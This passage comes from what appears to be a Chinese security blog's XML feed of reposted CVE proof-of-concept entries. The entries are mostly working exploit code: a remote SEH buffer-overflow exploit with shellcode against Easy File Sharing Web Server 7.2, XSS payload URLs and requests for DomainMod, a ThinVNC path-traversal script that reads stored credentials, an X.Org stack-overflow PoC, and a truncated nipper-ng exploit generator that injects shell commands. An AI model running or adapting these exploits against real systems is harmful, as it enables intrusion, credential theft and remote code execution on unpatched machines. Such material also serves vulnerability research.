      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> CVE复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> POC </tag>
            
            <tag> getshell </tag>
            
            <tag> FineCMS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Easy File Sharing Web Server 7.2 - GET 缓冲区溢出 (SEH)</title>
      <link href="2021/01/20/Easy%20File%20Sharing%20Web%20Server%207.2%20-%20GET%20%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%20(SEH)/"/>
      <url>2021/01/20/Easy%20File%20Sharing%20Web%20Server%207.2%20-%20GET%20%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%20(SEH)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>该文章为转载总结文章，如有侵权，请联系<a href="mailto:&#74;&#111;&#67;&#x61;&#116;&#x57;&#70;&#89;&#x40;&#x31;&#54;&#x33;&#x2e;&#x63;&#111;&#x6d;">&#74;&#111;&#67;&#x61;&#116;&#x57;&#70;&#89;&#x40;&#x31;&#54;&#x33;&#x2e;&#x63;&#111;&#x6d;</a></p><h3 id="Easy-File-Sharing-Web-Server-7-2-GET-缓冲区溢出-SEH"><a href="#Easy-File-Sharing-Web-Server-7-2-GET-缓冲区溢出-SEH" class="headerlink" title="Easy File Sharing Web Server 7.2 - GET 缓冲区溢出 (SEH)"></a>Easy File Sharing Web Server 7.2 - GET 缓冲区溢出 (SEH)</h3><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># Exploit Title: Easy File Sharing Web Server 7.2 - GET HTTP request SEH Buffer Overflow</span></span><br><span class="line"><span class="comment"># Tested on: XP SP3 EN</span></span><br><span class="line"><span class="comment"># category: Remote Exploit</span></span><br><span class="line"><span class="comment"># Usage: ./exploit.py ip port</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">host = <span class="built_in">str</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">port = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">a = socket.socket()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Connecting to: &quot;</span> + host + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(port)</span><br><span class="line">a.connect((host,port))</span><br><span class="line"></span><br><span class="line">entire=<span class="number">4500</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Junk</span></span><br><span class="line">buff = <span class="string">&quot;A&quot;</span>*<span class="number">4061</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Next SEH</span></span><br><span class="line">buff+= <span class="string">&quot;\xeb\x0A\x90\x90&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pop pop ret</span></span><br><span class="line">buff+= <span class="string">&quot;\x98\x97\x01\x10&quot;</span></span><br><span class="line"></span><br><span class="line">buff+= <span class="string">&quot;\x90&quot;</span>*<span class="number">19</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># calc.exe</span></span><br><span class="line"><span class="comment"># Bad Characters: \x20 \x2f \x5c</span></span><br><span class="line">shellcode = (</span><br><span class="line"><span class="string">&quot;\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9&quot;</span></span><br><span class="line"><span class="string">&quot;\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56&quot;</span></span><br><span class="line"><span class="string">&quot;\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9&quot;</span></span><br><span class="line"><span class="string">&quot;\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97&quot;</span></span><br><span class="line"><span class="string">&quot;\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64&quot;</span></span><br><span class="line"><span class="string">&quot;\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8&quot;</span></span><br><span class="line"><span class="string">&quot;\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a&quot;</span></span><br><span class="line"><span class="string">&quot;\x1c\x39\xbd&quot;</span></span><br><span class="line">)</span><br><span class="line">buff+= shellcode</span><br><span class="line"></span><br><span class="line">buff+= <span class="string">&quot;\x90&quot;</span>*<span class="number">7</span></span><br><span class="line"></span><br><span class="line">buff+= <span class="string">&quot;A&quot;</span>*(<span class="number">4500</span><span class="number">-4061</span><span class="number">-4</span><span class="number">-4</span><span class="number">-20</span>-<span class="built_in">len</span>(shellcode)<span class="number">-20</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># GET</span></span><br><span class="line">a.send(<span class="string">&quot;GET &quot;</span> + buff + <span class="string">&quot; HTTP/1.0\r\n\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">a.close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Done...&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> CVE复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> POC </tag>
            
            <tag> 缓冲区溢出 </tag>
            
            <tag> Easy File Sharing Web Server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DomainMod XSS 集合</title>
      <link href="2021/01/20/DomainMod%E7%9A%84XSS%E9%9B%86%E5%90%88/"/>
      <url>2021/01/20/DomainMod%E7%9A%84XSS%E9%9B%86%E5%90%88/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>该文章为转载总结文章，如有侵权，请联系<a href="mailto:&#x4a;&#x6f;&#x43;&#x61;&#x74;&#x57;&#x46;&#89;&#64;&#49;&#x36;&#x33;&#x2e;&#x63;&#x6f;&#109;">&#x4a;&#x6f;&#x43;&#x61;&#x74;&#x57;&#x46;&#89;&#64;&#49;&#x36;&#x33;&#x2e;&#x63;&#x6f;&#109;</a></p><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><table><thead><tr><th>漏洞名称</th><th>上报日期</th><th>漏洞发现者</th><th>产品首页</th><th>软件链接</th><th>版本</th><th>CVE编号</th></tr></thead><tbody><tr><td>DomainMod的XSS</td><td>2018-05-24</td><td>longer/套哥（<a href="mailto:&#116;&#97;&#111;&#103;&#x65;&#64;&#x35;&#101;&#x63;&#x75;&#114;&#x69;&#x74;&#x79;&#46;&#x63;&#x6e;">&#116;&#97;&#111;&#103;&#x65;&#64;&#x35;&#101;&#x63;&#x75;&#114;&#x69;&#x74;&#x79;&#46;&#x63;&#x6e;</a>）</td><td><a href="https://github.com/domainmod/domainmod">https://github.com/domainmod/domainmod</a></td><td><a href="https://github.com/domainmod/domainmod">https://github.com/domainmod/domainmod</a></td><td>4.09.03/4.10.0</td><td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11403">CVE-2018-11403</a>/<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11403">CVE-2018-11403</a>/<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11404">CVE-2018-11404</a>/<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11558">CVE-2018-11558</a>/<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11559">CVE-2018-11559</a></td></tr></tbody></table><h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><blockquote><p>DomainMod v4.09.03版本和v4.10.0版本 存在XSS的页面  </p></blockquote><h3 id="POC实现代码如下："><a href="#POC实现代码如下：" class="headerlink" title="POC实现代码如下："></a>POC实现代码如下：</h3><blockquote><p>DomainMod v4.09.03版本的“assets/edit/account-owner.php”页面的“oid”参数存在一个XSS漏洞，当用户登陆后访问url<code>http://127.0.0.1/assets/edit/account-owner.php?del=1&amp;oid=%27%22%28%29%26%25%3Cacx%3E%3CScRiPt%20%3Eprompt%28973761%29%3C/ScRiPt%3E</code>，会触发XSS漏洞。DomainMod是一个在github上开源的系统，漏洞发现者已经将漏洞信息通过<a href="https://github.com/domainmod/domainmod/issues/63">issues</a>告知作者。</p></blockquote><blockquote><p>CSRF测试页面代码如下：  </p></blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/assets/edit/account-owner.php?del=1&amp;oid=%27%22%28%29%26%25%3Cacx%3E%3CScRiPt%20%3Eprompt%28973761%29%3C/ScRiPt%3E</span><br></pre></td></tr></table></figure><blockquote><p>DomainMod v4.09.03版本的“assets/edit/ssl-provider-account.php”页面的“sslpaid”参数存在一个XSS漏洞，当用户登陆后访问url<code>http://127.0.0.1/assets/edit/ssl-provider-account.php?del=1&amp;sslpaid=%27%22%28%29%26%25%3Cacx%3E%3CScRiPt%20%3Eprompt%28931289%29%3C/ScRiPt%3E</code>，会触发XSS漏洞。DomainMod是一个在github上开源的系统，漏洞发现者已经将漏洞信息通过<a href="https://github.com/domainmod/domainmod/issues/63">issues</a>告知作者。</p></blockquote><blockquote><p>CSRF测试页面代码如下：  </p></blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/assets/edit/ssl-provider-account.php?del=1&amp;sslpaid=%27%22%28%29%26%25%3Cacx%3E%3CScRiPt%20%3Eprompt%28931289%29%3C/ScRiPt%3E</span><br></pre></td></tr></table></figure><blockquote><p>DomainMod 4.10.0版本的“/settings/profile/index.php”页面的“new_first_name”参数过滤不严格导致存在一个XSS漏洞。DomainMod是一个在github上开源的系统，漏洞发现者已经将漏洞信息通过<a href="https://github.com/domainmod/domainmod/issues/66">issues</a>告知作者。</p></blockquote><blockquote><p>用户登陆后提交如下数据包，更改用户信息后，当管理员查看用户是XSS漏洞触发：  </p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">post url https:&#x2F;&#x2F;demo.domainmod.org&#x2F;settings&#x2F;profile&#x2F;</span><br><span class="line">post data:new_first_name&#x3D;test%22%3E%3Cscript%3Ealert%28%2F1111%2F%29%3C%2Fscript%3E&amp;new_last_name&#x3D;test&amp;new_email_address&#x3D;test%40test.com&amp;new_currency&#x3D;USD&amp;new_timezone&#x3D;Canada%2FPacific&amp;new_expiration_emails&#x3D;0</span><br></pre></td></tr></table></figure><blockquote><p>DomainMod 4.10.0版本的“/settings/profile/index.php”页面的“new_last_name”参数过滤不严格导致存在一个存储型XSS漏洞。DomainMod是一个在github上开源的系统，漏洞发现者已经将漏洞信息通过<a href="https://github.com/domainmod/domainmod/issues/66">issues</a>告知作者。</p></blockquote><blockquote><p>用户登陆后提交如下数据包，更改用户信息后，当管理员查看用户是XSS漏洞触发：  </p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">post url https:&#x2F;&#x2F;demo.domainmod.org&#x2F;settings&#x2F;profile&#x2F;</span><br><span class="line">post data:new_first_name&#x3D;test&amp;new_last_name&#x3D;test%22%3E%3Cscript%3Ealert%28%2F1111%2F%29%3C%2Fscript%3E&amp;new_email_address&#x3D;test%40test.com&amp;new_currency&#x3D;USD&amp;new_timezone&#x3D;Canada%2FPacific&amp;new_expiration_emails&#x3D;0</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> CVE复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> POC </tag>
            
            <tag> XSS </tag>
            
            <tag> DomainMod </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinVNC 1.0b1 - Authentication Bypass</title>
      <link href="2021/01/20/CVE-2019-17662-ThinVNC%201.0b1%20-%20Authentication%20Bypass/"/>
      <url>2021/01/20/CVE-2019-17662-ThinVNC%201.0b1%20-%20Authentication%20Bypass/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>该文章为转载总结文章，如有侵权，请联系<a href="mailto:&#74;&#111;&#x43;&#97;&#116;&#87;&#70;&#89;&#64;&#x31;&#x36;&#x33;&#46;&#99;&#111;&#109;">&#74;&#111;&#x43;&#97;&#116;&#87;&#70;&#89;&#64;&#x31;&#x36;&#x33;&#46;&#99;&#111;&#109;</a></p><h2 id="ThinVNC-1-0b1-Authentication-Bypass"><a href="#ThinVNC-1-0b1-Authentication-Bypass" class="headerlink" title="ThinVNC 1.0b1 - Authentication Bypass"></a>ThinVNC 1.0b1 - Authentication Bypass</h2><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>ThinVNC是一款基于HTML5和AJAX的远程桌面实现  </p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: ThinVNC 1.0b1 - Authentication Bypass</span></span><br><span class="line"><span class="comment"># Date: 2019-10-17</span></span><br><span class="line"><span class="comment"># Exploit Author: Nikhith Tumamlapalli</span></span><br><span class="line"><span class="comment"># Contributor WarMarX</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://sourceforge.net/projects/thinvnc/</span></span><br><span class="line"><span class="comment"># Software Link: https://sourceforge.net/projects/thinvnc/files/ThinVNC_1.0b1/ThinVNC_1.0b1.zip/download</span></span><br><span class="line"><span class="comment"># Version: 1.0b1</span></span><br><span class="line"><span class="comment"># Tested on: Windows All Platforms</span></span><br><span class="line"><span class="comment"># CVE : CVE-2019-17662</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Description:</span></span><br><span class="line"><span class="comment"># Authentication Bypass via Arbitrary File Read</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>(<span class="params">host,port</span>):</span></span><br><span class="line">    url = <span class="string">&quot;http://&quot;</span> + host +<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/xyz/../../ThinVnc.ini&quot;</span></span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    body = r.text</span><br><span class="line">    print(body.splitlines()[<span class="number">2</span>])</span><br><span class="line">    print(body.splitlines()[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(sys.argv)!=<span class="number">3</span>):</span><br><span class="line">        print(<span class="string">&quot;Usage:\n&#123;&#125; &lt;host&gt; &lt;port&gt;\n&quot;</span>.<span class="built_in">format</span>(sys.argv[<span class="number">0</span>]))</span><br><span class="line">        print(<span class="string">&quot;Example:\n&#123;&#125; 192.168.0.10 5888&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        exploit(host,port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line">            </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> CVE复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> POC </tag>
            
            <tag> CVE-2019-17662 </tag>
            
            <tag> Authentication Bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-17624-X.Org X Server 1.20.4 - Local Stack Overflow-Linux图形界面X Server本地栈溢出POC</title>
      <link href="2021/01/20/CVE-2019-17624-X.Org%20X%20Server%201.20.4%20-%20Local%20Stack%20Overflow-Linux%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2X%20Server%E6%9C%AC%E5%9C%B0%E6%A0%88%E6%BA%A2%E5%87%BAPOC/"/>
      <url>2021/01/20/CVE-2019-17624-X.Org%20X%20Server%201.20.4%20-%20Local%20Stack%20Overflow-Linux%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2X%20Server%E6%9C%AC%E5%9C%B0%E6%A0%88%E6%BA%A2%E5%87%BAPOC/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>该文章为转载总结文章，如有侵权，请联系<a href="mailto:&#x4a;&#x6f;&#67;&#x61;&#x74;&#87;&#x46;&#89;&#x40;&#49;&#x36;&#x33;&#x2e;&#x63;&#x6f;&#109;">&#x4a;&#x6f;&#67;&#x61;&#x74;&#87;&#x46;&#89;&#x40;&#49;&#x36;&#x33;&#x2e;&#x63;&#x6f;&#109;</a></p><h2 id="CVE-2019-17624-X-Org-X-Server-1-20-4-Local-Stack-Overflow-Linux图形界面X-Server本地栈溢出POC"><a href="#CVE-2019-17624-X-Org-X-Server-1-20-4-Local-Stack-Overflow-Linux图形界面X-Server本地栈溢出POC" class="headerlink" title="CVE-2019-17624-X.Org X Server 1.20.4 - Local Stack Overflow-Linux图形界面X Server本地栈溢出POC"></a>CVE-2019-17624-X.Org X Server 1.20.4 - Local Stack Overflow-Linux图形界面X Server本地栈溢出POC</h2><p><strong>0x1 简单介绍</strong>  </p><p>X Server 是绝大对数<a href="https://mrxn.net/tag/Linux">Linux</a>发行版和Unix系统的基础图形界面程序，是系统标配。而此程序也是以Root权限启动的，因而成功溢出它而获得的<a href="https://mrxn.net/tag/shell">shell</a>，也是root权限。  </p><p><strong>0x2 漏洞相关信息</strong>  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 时间: 2019-10-16</span><br><span class="line"> </span><br><span class="line"># 作者: Marcelo Vázquez (s4vitar)</span><br><span class="line"> </span><br><span class="line"># 厂商: https:&#x2F;&#x2F;www.x.org&#x2F;</span><br><span class="line"> </span><br><span class="line"># 版本: &lt;&#x3D; 1.20.4</span><br><span class="line"> </span><br><span class="line"># 测试平台: Linux</span><br><span class="line"> </span><br><span class="line"># CVE: CVE-2019-17624</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> <strong>0x3 POC</strong>   </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># ************************************************************************</span></span><br><span class="line"><span class="comment"># *                Author: Marcelo Vázquez (aka s4vitar)                 *</span></span><br><span class="line"><span class="comment"># *      X.Org X Server 1.20.4 / X Protocol Version 11 (Stack Overflow)  *</span></span><br><span class="line"><span class="comment"># ************************************************************************</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> sys, time</span><br><span class="line"><span class="keyword">import</span> ctypes <span class="keyword">as</span> ct</span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> cast</span><br><span class="line"><span class="keyword">from</span> ctypes.util <span class="keyword">import</span> find_library</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">access_violation</span>(<span class="params">x11, current_display</span>):</span></span><br><span class="line">  keyboard = (ct.c_char * <span class="number">1000</span>)()</span><br><span class="line">  x11.XQueryKeymap(current_display, keyboard)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> </span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;\n[*] Loading x11...\n&quot;</span></span><br><span class="line">  time.sleep(<span class="number">2</span>)</span><br><span class="line"> </span><br><span class="line">  x11 = ct.cdll.LoadLibrary(find_library(<span class="string">&quot;X11&quot;</span>))</span><br><span class="line">  current_display = x11.XOpenDisplay(<span class="literal">None</span>)</span><br><span class="line"> </span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[*] Exploiting...\n&quot;</span></span><br><span class="line">  time.sleep(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    access_violation(x11, current_display)</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;\nError...\n&quot;</span></span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> CVE复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> POC </tag>
            
            <tag> X Sever </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-17424 nipper-ng_0.11.10-Remote_Buffer_Overflow远程缓冲区溢出附PoC</title>
      <link href="2021/01/20/cve-2019-17424%20nipper-ng_0.11.10-Remote_Buffer_Overflow%E8%BF%9C%E7%A8%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E9%99%84PoC/"/>
      <url>2021/01/20/cve-2019-17424%20nipper-ng_0.11.10-Remote_Buffer_Overflow%E8%BF%9C%E7%A8%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E9%99%84PoC/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>该文章为转载总结文章，如有侵权，请联系<a href="mailto:&#x4a;&#x6f;&#67;&#x61;&#x74;&#x57;&#70;&#89;&#64;&#49;&#54;&#x33;&#46;&#x63;&#x6f;&#x6d;">&#x4a;&#x6f;&#67;&#x61;&#x74;&#x57;&#70;&#89;&#64;&#49;&#54;&#x33;&#46;&#x63;&#x6f;&#x6d;</a></p><h2 id="CVE-2019-17424-nipper-ng-0-11-10-Remote-Buffer-Overflow远程缓冲区溢出附PoC"><a href="#CVE-2019-17424-nipper-ng-0-11-10-Remote-Buffer-Overflow远程缓冲区溢出附PoC" class="headerlink" title="CVE-2019-17424 nipper-ng_0.11.10-Remote_Buffer_Overflow远程缓冲区溢出附PoC"></a>CVE-2019-17424 nipper-ng_0.11.10-Remote_Buffer_Overflow远程缓冲区溢出附PoC</h2><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>Nipper是一个网络基础结构配置解析器，也是设备（防火墙，路由器以及网络基础设施）安全配置检查工具所以也是一种黑客工具，可也检查目标设备是否有脆弱性配置，它能检查并给出建议。</p></blockquote><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Exploit Title: nipper-ng 0.11.10 - Remote Buffer Overflow (PoC)</span><br><span class="line"># Date: 2019-10-20</span><br><span class="line"># Exploit Author: Guy Levin</span><br><span class="line"># https:&#x2F;&#x2F;blog.vastart.dev</span><br><span class="line"># Vendor Homepage: https:&#x2F;&#x2F;tools.kali.org&#x2F;reporting-tools&#x2F;nipper-ng</span><br><span class="line"># Software Link: https:&#x2F;&#x2F;code.google.com&#x2F;archive&#x2F;p&#x2F;nipper-ng&#x2F;source&#x2F;default&#x2F;source</span><br><span class="line"># Version:  0.11.10</span><br><span class="line"># Tested on: Debian</span><br><span class="line"># CVE : CVE-2019-17424</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    Exploit generator created by Guy Levin (@va_start - twitter.com&#x2F;va_start)</span><br><span class="line">    Vulnerability found by Guy Levin (@va_start - twitter.com&#x2F;va_start)</span><br><span class="line"></span><br><span class="line">    For a detailed writeup of CVE-2019-17424 and the exploit building process, read my blog post</span><br><span class="line">    https:&#x2F;&#x2F;blog.vastart.dev&#x2F;2019&#x2F;10&#x2F;stack-overflow-cve-2019-17424.html</span><br><span class="line"></span><br><span class="line">    may need to run nipper-ng with enviroment variable LD_BIND_NOW&#x3D;1 on ceratin systems</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line">def pack_dword(i):</span><br><span class="line">    return struct.pack(&quot;&lt;I&quot;, i)</span><br><span class="line"></span><br><span class="line">def prepare_shell_command(shell_command):</span><br><span class="line">    return shell_command.replace(&quot; &quot;, &quot;$&#123;IFS&#125;&quot;)</span><br><span class="line"></span><br><span class="line">def build_exploit(shell_command):</span><br><span class="line">    EXPLOIT_SKELETON &#x3D; r&quot;privilage exec level 1 &quot; \</span><br><span class="line">                        &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa &quot; \</span><br><span class="line">                        &quot;aasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaab &quot; \</span><br><span class="line">                        &quot;kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaacca &quot; \</span><br><span class="line">                        &quot;acdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaac &quot; \</span><br><span class="line">                        &quot;uaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadma &quot; \</span><br><span class="line">                        &quot;adnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaae &quot; \</span><br><span class="line">                        &quot;faaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewa &quot; \</span><br><span class="line">                        &quot;aexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaaf &quot; \</span><br><span class="line">                        &quot;paafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaagha &quot; \</span><br><span class="line">                        &quot;agiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaag &quot; \</span><br><span class="line">                        &quot;zaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahra &quot; \</span><br><span class="line">                        &quot;ahaaaataahuaahvaahwaahpaaaaaaazaaibaaicaaidaaieaaifaaigaaihaaiiaaijaai &quot; \</span><br><span class="line">                        &quot;kaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajca &quot; \</span><br><span class="line">                        &quot;ajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaaj&quot;</span><br><span class="line"></span><br><span class="line">    WRITEABLE_BUFFER &#x3D; 0x080FA001</span><br><span class="line">    CALL_TO_SYSTEM &#x3D; 0x0804E870</span><br><span class="line">    COMMAND_BUFFER &#x3D; 0x080FA015 </span><br><span class="line"></span><br><span class="line">    OFFSET_FOR_WRITEABLE_BUFFER &#x3D; 0x326</span><br><span class="line">    OFFSET_FOR_RETURN &#x3D; 0x33a</span><br><span class="line">    OFFSET_FOR_COMMAND_BUFFER &#x3D; 0x33e</span><br><span class="line">    </span><br><span class="line">    OFFSET_FOR_SHELL_COMMAND &#x3D; 0x2a</span><br><span class="line">    MAX_SHELL_COMMAND_CHARS &#x3D; 48</span><br><span class="line"></span><br><span class="line">    target_values_at_offsets &#x3D; &#123;</span><br><span class="line">        WRITEABLE_BUFFER : OFFSET_FOR_WRITEABLE_BUFFER, </span><br><span class="line">        CALL_TO_SYSTEM : OFFSET_FOR_RETURN, </span><br><span class="line">        COMMAND_BUFFER : OFFSET_FOR_COMMAND_BUFFER</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    exploit &#x3D; bytearray(EXPLOIT_SKELETON, &quot;ascii&quot;)</span><br><span class="line">    </span><br><span class="line">    # copy pointers</span><br><span class="line">    for target_value, target_offset in target_values_at_offsets.items():</span><br><span class="line">        target_value &#x3D; pack_dword(target_value)</span><br><span class="line">        exploit[target_offset:target_offset+len(target_value)] &#x3D; target_value</span><br><span class="line"></span><br><span class="line">    # copy payload</span><br><span class="line">    if len(shell_command) &gt; MAX_SHELL_COMMAND_CHARS:</span><br><span class="line">        raise ValueError(&quot;shell command is too big&quot;)</span><br><span class="line">    shell_command &#x3D; prepare_shell_command(shell_command)</span><br><span class="line">    if len(shell_command) &gt; MAX_SHELL_COMMAND_CHARS:</span><br><span class="line">        raise ValueError(&quot;shell command is too big after replacing spaces&quot;)</span><br><span class="line"></span><br><span class="line">    # adding padding to end of shell command</span><br><span class="line">    for i, letter in enumerate(shell_command + &quot;&amp;&amp;&quot;):</span><br><span 